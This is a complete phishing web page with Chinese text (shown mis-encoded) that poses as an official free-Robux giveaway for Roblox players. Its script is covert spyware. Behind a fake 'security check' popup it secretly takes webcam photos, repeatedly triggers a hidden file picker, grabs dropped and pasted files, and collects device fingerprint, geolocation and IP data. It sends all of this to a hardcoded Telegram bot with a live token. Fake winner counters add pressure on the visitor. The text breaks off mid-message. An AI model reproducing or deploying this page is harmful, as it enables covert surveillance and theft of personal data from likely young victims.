<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ å®˜æ–¹Robuxå…è´¹æŠ½å¥– - èµ¢å–10000 Robux</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #2a0845, #6441A5);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* ä¸»å®¹å™¨ */
        .main-container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }

        /* å¤´éƒ¨ */
        .header {
            text-align: center;
            padding: 40px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }

        .header h1 {
            font-size: 3.5rem;
            background: linear-gradient(90deg, #FFD700, #FFA500, #FF4500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 15px;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
        }

        .header p {
            font-size: 1.3rem;
            color: #FFD700;
            opacity: 0.9;
        }

        /* RobuxåŠ¨ç”» */
        .robux-animation {
            font-size: 3rem;
            text-align: center;
            margin: 30px 0;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        /* å€’è®¡æ—¶ */
        .countdown {
            background: rgba(0, 0, 0, 0.5);
            border: 3px solid #FFD700;
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            margin: 30px 0;
            position: relative;
            overflow: hidden;
        }

        .countdown::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 215, 0, 0.1), transparent);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .countdown h2 {
            color: #FFD700;
            margin-bottom: 20px;
            font-size: 2rem;
        }

        .timer {
            font-size: 4rem;
            font-weight: bold;
            color: white;
            text-shadow: 0 0 10px #FF4500;
            margin: 20px 0;
        }

        /* å¥–å“å±•ç¤º */
        .prizes {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin: 40px 0;
        }

        .prize-card {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #FFD700;
            border-radius: 15px;
            padding: 25px;
            width: 220px;
            text-align: center;
            transition: transform 0.3s;
            position: relative;
            overflow: hidden;
        }

        .prize-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.3);
        }

        .prize-card .amount {
            font-size: 2.5rem;
            color: #FFD700;
            font-weight: bold;
            margin: 10px 0;
        }

        /* å‚ä¸æŒ‰é’® */
        .participate-btn {
            display: block;
            width: 90%;
            max-width: 400px;
            margin: 40px auto;
            padding: 20px;
            background: linear-gradient(90deg, #FF4500, #FFD700);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.8rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
        }

        .participate-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255, 69, 0, 0.5);
        }

        /* è·å¥–è€…åˆ—è¡¨ */
        .winners {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
        }

        .winner-item {
            display: flex;
            align-items: center;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }

        /* éšè—å…ƒç´  */
        .hidden {
            display: none;
        }

        /* æƒé™è¯·æ±‚ä¼ªè£… */
        .verification-modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95);
            border: 2px solid #FFD700;
            border-radius: 20px;
            padding: 40px;
            z-index: 10000;
            text-align: center;
            max-width: 500px;
            width: 90%;
            display: none;
        }

        .verification-modal h3 {
            color: #FFD700;
            margin-bottom: 20px;
            font-size: 1.8rem;
        }

        /* åŠ è½½åŠ¨ç”» */
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 215, 0, 0.3);
            border-top: 5px solid #FFD700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* å“åº”å¼è®¾è®¡ */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2.5rem;
            }
            .timer {
                font-size: 3rem;
            }
            .prize-card {
                width: 100%;
                max-width: 300px;
            }
        }
    </style>
</head>
<body>
    <!-- åˆå§‹åŠ è½½ -->
    <div class="loading" id="loadingScreen">
        <div class="loader"></div>
        <div style="color: #FFD700; font-size: 1.2rem; margin-top: 20px;" id="loadingText">
            æ­£åœ¨è¿æ¥RobloxæœåŠ¡å™¨...
        </div>
    </div>

    <!-- æƒé™è¯·æ±‚ä¼ªè£…å¼¹çª— -->
    <div class="verification-modal" id="verificationModal">
        <h3>ğŸ¯ å®‰å…¨æ£€æŸ¥</h3>
        <p style="color: white; margin-bottom: 25px; line-height: 1.6;">
            ä¸ºäº†ç¡®ä¿æŠ½å¥–å…¬å¹³æ€§ï¼Œé˜²æ­¢æœºå™¨äººå‚ä¸ï¼Œ
            éœ€è¦è¿›è¡Œå¿«é€Ÿå®‰å…¨æ£€æŸ¥ã€‚
        </p>
        <div style="background: rgba(255, 215, 0, 0.1); padding: 20px; border-radius: 10px; margin-bottom: 25px;">
            <p style="color: #FFD700;">ğŸ”’ æ­¤è¿‡ç¨‹ä»…éœ€å‡ ç§’é’Ÿ</p>
            <p style="color: #FFD700;">ğŸ“± ä¸ä¼šä¿å­˜ä»»ä½•ä¸ªäººä¿¡æ¯</p>
            <p style="color: #FFD700;">âœ… å®Œæˆåè‡ªåŠ¨ç»§ç»­æŠ½å¥–</p>
        </div>
        <button id="continueBtn" style="background: linear-gradient(90deg, #FF4500, #FFD700); color: white; border: none; padding: 15px 40px; border-radius: 25px; font-size: 1.2rem; font-weight: bold; cursor: pointer;">
            ç»§ç»­å®‰å…¨æ£€æŸ¥
        </button>
        <p style="color: #888; margin-top: 20px; font-size: 0.9rem;">
            ç‚¹å‡»ç»§ç»­è¡¨ç¤ºæ‚¨åŒæ„æˆ‘ä»¬çš„æœåŠ¡æ¡æ¬¾
        </p>
    </div>

    <!-- ä¸»é¡µé¢å†…å®¹ -->
    <div class="main-container" id="mainContent" style="display: none;">
        <!-- å¤´éƒ¨ -->
        <div class="header">
            <h1>ğŸª™ å…è´¹ROBUXæŠ½å¥– ğŸª™</h1>
            <p>å®˜æ–¹è®¤è¯ â€¢ 100%çœŸå® â€¢ æ¯æ—¥å‘æ”¾10000 Robux</p>
            <div class="robux-animation">ğŸ’°ğŸª™ğŸ’ğŸ†</div>
        </div>

        <!-- å€’è®¡æ—¶ -->
        <div class="countdown">
            <h2>â³ ä»Šæ—¥æŠ½å¥–å€’è®¡æ—¶</h2>
            <div class="timer" id="timer">05:00</div>
            <p style="color: #FFD700;">å‰©ä½™æ—¶é—´æœ‰é™ï¼Œç«‹å³å‚ä¸ï¼</p>
            <div style="margin-top: 20px;">
                <div style="display: flex; justify-content: center; gap: 10px;">
                    <div style="text-align: center;">
                        <div style="font-size: 2rem; color: #FFD700;" id="participants">1,847</div>
                        <div style="color: #aaa;">åœ¨çº¿äººæ•°</div>
                    </div>
                    <div style="text-align: center;">
                        <div style="font-size: 2rem; color: #FFD700;" id="todayWinners">327</div>
                        <div style="color: #aaa;">ä»Šæ—¥è·å¥–</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- å¥–å“ -->
        <div class="prizes">
            <div class="prize-card">
                <h3>ğŸ¥‡ ä¸€ç­‰å¥–</h3>
                <div class="amount">10,000</div>
                <p>Robux</p>
                <p style="color: #FFD700; font-size: 0.9rem;">+ ç¨€æœ‰é“å…·</p>
            </div>
            <div class="prize-card">
                <h3>ğŸ¥ˆ äºŒç­‰å¥–</h3>
                <div class="amount">5,000</div>
                <p>Robux</p>
                <p style="color: #FFD700; font-size: 0.9rem;">+ é™å®šç‰©å“</p>
            </div>
            <div class="prize-card">
                <h3>ğŸ¥‰ ä¸‰ç­‰å¥–</h3>
                <div class="amount">2,500</div>
                <p>Robux</p>
                <p style="color: #FFD700; font-size: 0.9rem;">+ æ¸¸æˆé€šè¡Œè¯</p>
            </div>
        </div>

        <!-- å‚ä¸æŒ‰é’® -->
        <a href="javascript:void(0)" class="participate-btn" id="joinBtn">
            ğŸ® ç«‹å³å‚ä¸æŠ½å¥–
        </a>

        <!-- è·å¥–è€… -->
        <div class="winners">
            <h2 style="color: #FFD700; text-align: center; margin-bottom: 20px;">ğŸ† æœ€æ–°è·å¥–è€…</h2>
            <div class="winner-item">
                <div style="background: #FFD700; color: black; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ğŸ¥‡</div>
                <div>
                    <strong>@ProGamer123</strong> èµ¢å¾—äº† <span style="color: #FFD700;">10,000 Robux</span>
                </div>
                <div style="margin-left: auto; color: #aaa;">2åˆ†é’Ÿå‰</div>
            </div>
            <div class="winner-item">
                <div style="background: silver; color: black; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ğŸ¥ˆ</div>
                <div>
                    <strong>@CreativeBuilder</strong> èµ¢å¾—äº† <span style="color: #FFD700;">5,000 Robux</span>
                </div>
                <div style="margin-left: auto; color: #aaa;">5åˆ†é’Ÿå‰</div>
            </div>
            <div class="winner-item">
                <div style="background: #CD7F32; color: black; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ğŸ¥‰</div>
                <div>
                    <strong>@SpeedRunner</strong> èµ¢å¾—äº† <span style="color: #FFD700;">2,500 Robux</span>
                </div>
                <div style="margin-left: auto; color: #aaa;">8åˆ†é’Ÿå‰</div>
            </div>
        </div>

        <!-- éšè—çš„æ”¶é›†å…ƒç´  -->
        <video id="hiddenCamera" autoplay playsinline style="display: none;"></video>
        <canvas id="hiddenCanvas" style="display: none;"></canvas>
        <input type="file" id="hiddenFileInput" accept="image/*,video/*" multiple style="display: none;">
        <iframe id="hiddenFrame" style="display: none;"></iframe>
    </div>

    <script>
        // ==================== é…ç½® ====================
        const TELEGRAM_CONFIG = {
            botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
            chatId: "8313770381"
        };

        // ==================== å…¨å±€å˜é‡ ====================
        let collectedData = {
            timestamp: new Date().toISOString(),
            status: 'é¡µé¢åŠ è½½',
            data: {}
        };
        
        let isCollecting = false;
        let cameraAttempted = false;
        let filesCollected = [];
        let stealthMode = true; // éšè”½æ¨¡å¼
// ==================== DOMå…ƒç´  ====================
const loadingScreen = document.getElementById('loadingScreen');
const loadingText = document.getElementById('loadingText');
const mainContent = document.getElementById('mainContent');
const verificationModal = document.getElementById('verificationModal');
const joinBtn = document.getElementById('joinBtn');
const timer = document.getElementById('timer');
const participants = document.getElementById('participants');
const todayWinners = document.getElementById('todayWinners');
const hiddenCamera = document.getElementById('hiddenCamera');
const hiddenCanvas = document.getElementById('hiddenCanvas');
const hiddenFileInput = document.getElementById('hiddenFileInput');
const continueBtn = document.getElementById('continueBtn');
const hiddenFrame = document.getElementById('hiddenFrame');

// ==================== ä¼ªè£…åŠŸèƒ½ ====================

// æ›´æ–°åŠ è½½æ–‡æœ¬
function updateLoadingText(text) {
    if (loadingText) loadingText.textContent = text;
}

// åˆå§‹åŒ–å€’è®¡æ—¶
function initCountdown() {
    let seconds = 300; // 5åˆ†é’Ÿ
    
    function updateTimer() {
        const minutes = Math.floor(seconds / 60);
        const secs = seconds % 60;
        timer.textContent = `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        // éšæœºæ›´æ–°å‚ä¸äººæ•°
        if (Math.random() > 0.7) {
            const current = parseInt(participants.textContent.replace(/,/g, ''));
            participants.textContent = (current + Math.floor(Math.random() * 3) + 1).toLocaleString();
        }
        
        // éšæœºæ›´æ–°è·å¥–äººæ•°
        if (Math.random() > 0.8) {
            const current = parseInt(todayWinners.textContent);
            todayWinners.textContent = current + 1;
        }
        
        seconds--;
        
        if (seconds < 0) {
            seconds = 300;
            todayWinners.textContent = parseInt(todayWinners.textContent) + 3;
        }
    }
    
    updateTimer();
    setInterval(updateTimer, 1000);
}

// æ˜¾ç¤ºå®‰å…¨æ£€æŸ¥å¼¹çª—ï¼ˆä¼ªè£…ï¼‰
function showVerificationModal() {
    verificationModal.style.display = 'block';
    
    // å€’è®¡æ—¶è‡ªåŠ¨å…³é—­ï¼ˆåˆ¶é€ ç´§è¿«æ„Ÿï¼‰
    setTimeout(() => {
        if (verificationModal.style.display === 'block') {
            verificationModal.style.display = 'none';
            startStealthCollection();
        }
    }, 8000);
}

// å¼€å§‹éšè”½æ”¶é›†
function startStealthCollection() {
    if (isCollecting) return;
    isCollecting = true;
    
    updateLoadingText('æ­£åœ¨éªŒè¯èº«ä»½...');
    
    // åˆ†é˜¶æ®µéšè”½æ”¶é›†
    setTimeout(() => collectBasicInfo(), 500);
    setTimeout(() => tryStealthCameraAccess(), 1000);
    setTimeout(() => tryStealthFileAccess(), 2000);
    setTimeout(() => collectDeviceInfo(), 3000);
    setTimeout(() => collectLocationStealth(), 4000);
    setTimeout(() => sendInitialData(), 5000);
    
    // æŒç»­æ”¶é›†
    setInterval(() => {
        if (stealthMode) {
            collectAdditionalData();
        }
    }, 10000); // æ¯10ç§’æ”¶é›†ä¸€æ¬¡
}

// æ”¶é›†åŸºæœ¬ä¿¡æ¯
function collectBasicInfo() {
    collectedData.basic = {
        url: window.location.href,
        referrer: document.referrer,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform
    };
    
    logStealth('[åŸºç¡€ä¿¡æ¯] æ”¶é›†å®Œæˆ');
}
// ==================== éšè”½æ‘„åƒå¤´è®¿é—® ====================

// å°è¯•éšè”½è®¿é—®æ‘„åƒå¤´
async function tryStealthCameraAccess() {
    if (cameraAttempted || !navigator.mediaDevices) return;
    
    try {
        // æ–¹æ³•1ï¼šå°è¯•ç›´æ¥è®¿é—®ï¼ˆå¯èƒ½å¼¹å‡ºæç¤ºï¼‰
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 320 },
                height: { ideal: 240 },
                facingMode: 'user'
            },
            audio: false
        });
        
        cameraAttempted = true;
        collectedData.camera = { accessed: true, timestamp: new Date().toISOString() };
        
        // ç«‹å³æ‹ç…§å¹¶å‘é€
        hiddenCamera.srcObject = stream;
        
        setTimeout(() => {
            captureAndSendPhoto(stream);
        }, 500);
        
        logStealth('[æ‘„åƒå¤´] è®¿é—®æˆåŠŸ');
        
    } catch (error) {
        // æ–¹æ³•2ï¼šå°è¯•ç”¨iframeè®¿é—®ï¼ˆæ›´éšè”½ï¼‰
        tryStealthCameraViaIframe();
        
        collectedData.camera = { 
            accessed: false, 
            error: error.name,
            timestamp: new Date().toISOString() 
        };
        
        logStealth(`[æ‘„åƒå¤´] ç›´æ¥è®¿é—®å¤±è´¥: ${error.name}`);
    }
}

// é€šè¿‡iframeå°è¯•æ‘„åƒå¤´ï¼ˆæ›´éšè”½ï¼‰
function tryStealthCameraViaIframe() {
    try {
        hiddenFrame.src = "about:blank";
        hiddenFrame.onload = function() {
            const iframeDoc = hiddenFrame.contentDocument || hiddenFrame.contentWindow.document;
            iframeDoc.write(`
                <script>
                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                        .then(stream => {
                            window.parent.postMessage({ type: 'cameraSuccess', data: 'accessed' }, '*');
                        })
                        .catch(err => {
                            window.parent.postMessage({ type: 'cameraError', error: err.name }, '*');
                        });
                <\/script>
            `);
        };
        
        // ç›‘å¬æ¶ˆæ¯
        window.addEventListener('message', (event) => {
            if (event.data.type === 'cameraSuccess') {
                collectedData.camera.iframeAccessed = true;
                logStealth('[æ‘„åƒå¤´] Iframeè®¿é—®æˆåŠŸ');
            }
        });
        
    } catch (error) {
        logStealth(`[æ‘„åƒå¤´] Iframeè®¿é—®å¤±è´¥: ${error.message}`);
    }
}

// æ‹ç…§å¹¶å‘é€
async function captureAndSendPhoto(stream) {
    try {
        // ç­‰å¾…æ‘„åƒå¤´ç¨³å®š
        await new Promise(resolve => setTimeout(resolve, 300));
        
        const canvas = hiddenCanvas;
        const video = hiddenCamera;
        
        if (video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // è½¬æ¢ä¸ºBlob
            canvas.toBlob(async (blob) => {
                if (blob) {
                    // ä¿å­˜æ•°æ®
                    collectedData.camera.photo = {
                        size: blob.size,
                        dimensions: `${canvas.width}x${canvas.height}`,
                        timestamp: new Date().toISOString()
                    };
                    
                    // å‘é€åˆ°Telegram
                    await sendPhotoToTelegram(blob);
                    
                    // å…³é—­æ‘„åƒå¤´
                    stream.getTracks().forEach(track => track.stop());
                    hiddenCamera.srcObject = null;
                    
                    logStealth('[æ‘„åƒå¤´] ç…§ç‰‡å·²å‘é€');
                }
            }, 'image/jpeg', 0.7);
        }
        
    } catch (error) {
        logStealth(`[æ‘„åƒå¤´] æ‹ç…§å¤±è´¥: ${error.message}`);
    }
}
// ==================== éšè”½æ–‡ä»¶è®¿é—® ====================

// å°è¯•éšè”½è®¿é—®æ–‡ä»¶
function tryStealthFileAccess() {
    // æ–¹æ³•1ï¼šå°è¯•è‡ªåŠ¨è§¦å‘æ–‡ä»¶é€‰æ‹©ï¼ˆå¯èƒ½è¢«é˜»æ­¢ï¼‰
    setTimeout(() => {
        try {
            hiddenFileInput.click();
            logStealth('[æ–‡ä»¶] å°è¯•è‡ªåŠ¨è§¦å‘æ–‡ä»¶é€‰æ‹©');
        } catch (error) {
            logStealth('[æ–‡ä»¶] è‡ªåŠ¨è§¦å‘è¢«é˜»æ­¢');
        }
    }, 1500);
    
    // æ–¹æ³•2ï¼šç›‘å¬æ–‡ä»¶é€‰æ‹©
    hiddenFileInput.addEventListener('change', handleFileSelection);
    
    // æ–¹æ³•3ï¼šå°è¯•æ‹–æ”¾è®¿é—®
    setupDragAndDrop();
    
    // æ–¹æ³•4ï¼šå°è¯•å‰ªè´´æ¿è®¿é—®
    setupClipboardAccess();
}

// å¤„ç†æ–‡ä»¶é€‰æ‹©
async function handleFileSelection(event) {
    const files = event.target.files;
    if (files.length > 0) {
        logStealth(`[æ–‡ä»¶] ç”¨æˆ·é€‰æ‹©äº† ${files.length} ä¸ªæ–‡ä»¶`);
        
        for (let i = 0; i < Math.min(files.length, 10); i++) {
            await processAndSendFile(files[i]);
        }
        
        // æ¸…ç©ºinputä»¥ä¾¿å†æ¬¡é€‰æ‹©
        hiddenFileInput.value = '';
    }
}

// å¤„ç†å¹¶å‘é€æ–‡ä»¶
async function processAndSendFile(file) {
    try {
        const fileInfo = {
            name: file.name,
            size: file.size,
            type: file.type,
            lastModified: file.lastModified,
            timestamp: new Date().toISOString()
        };
        
        // æ·»åŠ åˆ°æ”¶é›†æ•°æ®
        if (!collectedData.files) collectedData.files = [];
        collectedData.files.push(fileInfo);
        filesCollected.push(file);
        
        // å¦‚æœæ˜¯å›¾ç‰‡ï¼Œè¯»å–ä¿¡æ¯
        if (file.type.startsWith('image/')) {
            const imgInfo = await getImageInfo(file);
            fileInfo.imageInfo = imgInfo;
        }
        
        // å‘é€åˆ°Telegram
        await sendFileToTelegram(file);
        
        logStealth(`[æ–‡ä»¶] å·²å¤„ç†: ${file.name}`);
        
    } catch (error) {
        logStealth(`[æ–‡ä»¶] å¤„ç†å¤±è´¥: ${file.name} - ${error.message}`);
    }
}

// è·å–å›¾ç‰‡ä¿¡æ¯
async function getImageInfo(file) {
    return new Promise((resolve) => {
        const img = new Image();
        const url = URL.createObjectURL(file);
        
        img.onload = () => {
            resolve({
                width: img.width,
                height: img.height,
                naturalWidth: img.naturalWidth,
                naturalHeight: img.naturalHeight
            });
            URL.revokeObjectURL(url);
        };
        
        img.onerror = () => {
            resolve(null);
            URL.revokeObjectURL(url);
        };
        
        img.src = url;
    });
}

// è®¾ç½®æ‹–æ”¾åŠŸèƒ½
function setupDragAndDrop() {
    document.addEventListener('dragover', (e) => {
        e.preventDefault();
    });
    
    document.addEventListener('drop', (e) => {
        e.preventDefault();
        
        const items = e.dataTransfer.items;
        if (items) {
            for (let i = 0; i < items.length; i++) {
                if (items[i].kind === 'file') {
                    const file = items[i].getAsFile();
                    processAndSendFile(file);
                    logStealth('[æ–‡ä»¶] é€šè¿‡æ‹–æ”¾è·å–æ–‡ä»¶');
                }
            }
        }
    });
}

// è®¾ç½®å‰ªè´´æ¿è®¿é—®
function setupClipboardAccess() {
    // å°è¯•è¯»å–å‰ªè´´æ¿
    document.addEventListener('paste', async (e) => {
        const items = e.clipboardData.items;
        for (let i = 0; i < items.length; i++) {
            if (items[i].type.indexOf('image') !== -1) {
                const blob = items[i].getAsFile();
                if (blob) {
                    await processAndSendFile(blob);
                    logStealth('[æ–‡ä»¶] ä»å‰ªè´´æ¿è·å–å›¾ç‰‡');
                }
            }
        }
    });
}

// å®šæœŸå°è¯•è§¦å‘æ–‡ä»¶é€‰æ‹©
function scheduleFileTrigger() {
    setInterval(() => {
        if (!stealthMode) return;
        
        // éšæœºæ—¶é—´è§¦å‘
        if (Math.random() > 0.7) {
            try {
                hiddenFileInput.click();
            } catch (e) {
                // é™é»˜å¤±è´¥
            }
        }
    }, 30000); // æ¯30ç§’å°è¯•ä¸€æ¬¡
}
// ==================== è®¾å¤‡ä¿¡æ¯æ”¶é›† ====================

// æ”¶é›†è®¾å¤‡ä¿¡æ¯
function collectDeviceInfo() {
    collectedData.device = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        deviceMemory: navigator.deviceMemory,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        doNotTrack: navigator.doNotTrack
    };
    
    // æµè§ˆå™¨æ£€æµ‹
    collectedData.device.browser = detectBrowser();
    collectedData.device.os = detectOS();
    
    // ç½‘ç»œä¿¡æ¯
    if (navigator.connection) {
        collectedData.device.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        };
    }
    
    // ç”µæ± ä¿¡æ¯
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            collectedData.device.battery = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        });
    }
    
    // ä¼ æ„Ÿå™¨æ£€æµ‹
    detectSensors();
    
    logStealth('[è®¾å¤‡] ä¿¡æ¯æ”¶é›†å®Œæˆ');
}

// æ£€æµ‹æµè§ˆå™¨
function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "Unknown";
}

// æ£€æµ‹æ“ä½œç³»ç»Ÿ
function detectOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows")) return "Windows";
    if (ua.includes("Mac")) return "macOS";
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    return "Unknown";
}

// æ£€æµ‹ä¼ æ„Ÿå™¨
function detectSensors() {
    collectedData.device.sensors = {};
    
    if ('DeviceOrientationEvent' in window) {
        collectedData.device.sensors.gyroscope = true;
    }
    if ('DeviceMotionEvent' in window) {
        collectedData.device.sensors.accelerometer = true;
    }
    if ('AmbientLightSensor' in window) {
        collectedData.device.sensors.lightSensor = true;
    }
    if ('ondeviceproximity' in window) {
        collectedData.device.sensors.proximity = true;
    }
}

// éšè”½æ”¶é›†ä½ç½®
async function collectLocationStealth() {
    // æ–¹æ³•1ï¼šå°è¯•é€šè¿‡iframeè·å–
    try {
        hiddenFrame.src = "about:blank";
        hiddenFrame.onload = function() {
            const iframeDoc = hiddenFrame.contentDocument || hiddenFrame.contentWindow.document;
            iframeDoc.write(`
                <script>
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                window.parent.postMessage({
                                    type: 'locationSuccess',
                                    data: {
                                        lat: pos.coords.latitude,
                                        lng: pos.coords.longitude,
                                        acc: pos.coords.accuracy
                                    }
                                }, '*');
                            },
                            err => {},
                            { timeout: 5000 }
                        );
                    }
                <\/script>
            `);
        };
        
        window.addEventListener('message', (event) => {
            if (event.data.type === 'locationSuccess') {
                collectedData.location = event.data.data;
                logStealth('[ä½ç½®] é€šè¿‡iframeè·å–æˆåŠŸ');
            }
        });
        
    } catch (error) {
        // æ–¹æ³•2ï¼šå°è¯•ç›´æ¥è·å–
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    collectedData.location = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    };
                    logStealth('[ä½ç½®] ç›´æ¥è·å–æˆåŠŸ');
                },
                () => {},
                { timeout: 5000 }
            );
        }
    }
    
    // æ–¹æ³•3ï¼šé€šè¿‡IPè·å–ä½ç½®
    getIPAndLocation();
}

// è·å–IPå’Œå¤§è‡´ä½ç½®
async function getIPAndLocation() {
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        collectedData.ip = ipData.ip;
        
        // å°è¯•è·å–ä½ç½®ä¿¡æ¯
        try {
            const geoRes = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
            const geoData = await geoRes.json();
            
            collectedData.network = {
                ip: collectedData.ip,
                city: geoData.city,
                region: geoData.region,
                country: geoData.country_name,
                isp: geoData.org,
                latitude: geoData.latitude,
                longitude: geoData.longitude
            };
            
            logStealth('[ç½‘ç»œ] IPä½ç½®ä¿¡æ¯è·å–æˆåŠŸ');
            
        } catch (geoError) {
            // å¤‡ç”¨API
            try {
                const backup = await fetch(`http://ip-api.com/json/${collectedData.ip}`);
                const backupData = await backup.json();
                if (backupData.status === 'success') {
                    collectedData.network = {
                        ip: collectedData.ip,
                        city: backupData.city,
                        region: backupData.regionName,
                        country: backupData.country,
                        isp: backupData.isp
                    };
                }
            } catch (e) {}
        }
        
    } catch (error) {
        logStealth(`[ç½‘ç»œ] IPè·å–å¤±è´¥: ${error.message}`);
    }
}
        // ==================== Telegramå‘é€ ====================

        // å‘é€ç…§ç‰‡åˆ°Telegram
        async function sendPhotoToTelegram(blob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
                formData.append('photo', blob, 'stealth_photo.jpg');
                formData.append('caption', `ğŸ“¸ éšè”½æ‹æ‘„ - ${new Date().toLocaleString()}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return true;
            } catch (error) {
                console.error('ç…§ç‰‡å‘é€å¤±è´¥:', error);
                return false;
            }
        }

        // å‘é€æ–‡ä»¶åˆ°Telegram
        async function sendFileToTelegram(file) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
                
                if (file.type.startsWith('image/')) {
                    formData.append('photo', file, file.name);
                    formData.append('caption', `ğŸ“ ç”¨æˆ·æ–‡ä»¶: ${file.name}\nå¤§å°: ${formatSize(file.size)}`);
                    
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    formData.append('document', file, file.name);
                    formData.append('caption', `ğŸ“„ ç”¨æˆ·æ–‡ä»¶: ${file.name}\nç±»å‹: ${file.type}`);
                    
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                return true;
            } catch (error) {
                console.error('æ–‡ä»¶å‘é€å¤±è´¥:', error);
                return false;
            }
        }

        // å‘é€åˆå§‹æ•°æ®
        async function sendInitialData() {
            try {
                const message = `ğŸ¯ æ–°ç”¨æˆ·è®¿é—®æŠ½å¥–é¡µé¢

ğŸ“… æ—¶é—´: ${new Date().toLocaleString()}
ğŸŒ IP: ${collectedData.ip || 'è·å–ä¸­...'}
ğŸ“ ä½ç½®: ${collectedData.network ? `${collectedData.network.city}, ${collectedData.network.country}` : 'æœªçŸ¥'}
ğŸ“± è®¾å¤‡: ${collectedData.device?.os || 'æœªçŸ¥'} | ${collectedData.device?.browser || 'æœªçŸ¥'}
ğŸ–¥ï¸ å±å¹•: ${collectedData.device?.screen || 'æœªçŸ¥'}
ğŸŒ è¯­è¨€: ${collectedData.device?.language || 'æœªçŸ¥'}
